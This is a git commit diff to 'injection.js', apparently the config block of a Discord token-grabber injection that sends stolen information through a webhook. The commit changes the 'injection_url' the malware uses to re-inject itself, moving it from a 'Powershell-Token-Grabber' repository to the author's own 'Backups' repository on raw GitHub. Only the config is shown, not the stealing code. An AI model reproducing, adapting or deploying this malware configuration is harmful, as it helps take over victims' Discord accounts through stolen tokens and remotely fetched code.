836e8028950d2b803b01d2574c97d95a0c5eded3
SixZens <106856251+SixZensED@users.noreply.github.com>
2023-03-10 01:10:32 +0700

    Update injection.js

--- injection.js
+++ injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'SixZens Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1083442192313495612/1083442378905493684/Wumpus.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16777215, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/SixZensED/Backups/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
